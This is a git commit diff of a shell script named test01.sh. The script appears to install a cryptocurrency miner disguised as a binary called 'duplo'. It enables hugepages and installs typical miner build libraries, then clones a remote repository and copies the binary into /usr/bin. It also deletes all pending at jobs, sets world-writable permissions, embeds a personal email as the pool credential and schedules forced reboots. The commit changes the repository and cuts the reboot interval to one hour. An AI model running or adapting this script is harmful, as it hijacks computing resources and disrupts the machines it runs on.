ffc13d168b13fb851be94575be2bbef9a2e51f2c
rekek <47266646+rekek@users.noreply.github.com>
2019-02-13 11:44:41 -0800

    Update test01.sh

--- test01.sh
+++ test01.sh
@@ -6,24 +6,24 @@ MAIL=kotminkot@yandex.ru
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
-rm -rf /tmp/duplo/
+rm -rf /tmp/server7/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir duplo
-git clone https://github.com/duplo2/duplo.git /tmp/duplo
-cd /tmp/duplo
-chmod +x /tmp/duplo/duplo
+cd /tmp && mkdir server7
+git clone https://github.com/rekek/server7.git /tmp/server7
+cd /tmp/server7
+chmod +x /tmp/server7/duplo
 chmod 777 ./*.sh
-cp /tmp/duplo/duplo /usr/bin/
+cp /tmp/server7/duplo /usr/bin/
 sleep 3
 
 touch /tmp/at.txt
 echo 'sudo reboot -f' >> /tmp/at.txt
-at now + 6 hours < /tmp/at.txt
+at now + 1 hours < /tmp/at.txt
 echo -e 'Restart job specified'
 sleep 3
 sudo apt-get install dos2unix
